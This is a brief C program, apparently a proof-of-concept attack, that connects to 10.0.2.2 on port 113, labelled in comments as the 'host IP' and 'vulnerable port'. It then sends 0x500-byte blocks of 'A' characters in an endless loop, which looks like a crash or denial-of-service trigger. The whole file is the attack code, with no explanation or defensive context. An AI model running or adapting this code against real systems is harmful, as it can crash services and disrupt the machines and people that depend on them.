#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    int s, ret;
    struct sockaddr_in ip_addr;
    char buf[0x500];

    s = socket(AF_INET, SOCK_STREAM, 0);
    ip_addr.sin_family = AF_INET;
    ip_addr.sin_addr.s_addr = inet_addr("10.0.2.2"); // host IP
    ip_addr.sin_port = htons(113);                   // vulnerable port
    ret = connect(s, (struct sockaddr *)&ip_addr, sizeof(struct sockaddr_in));
    memset(buf, 'A', 0x500);
    while (1) {
        write(s, buf, 0x500);
    }
    return 0;
}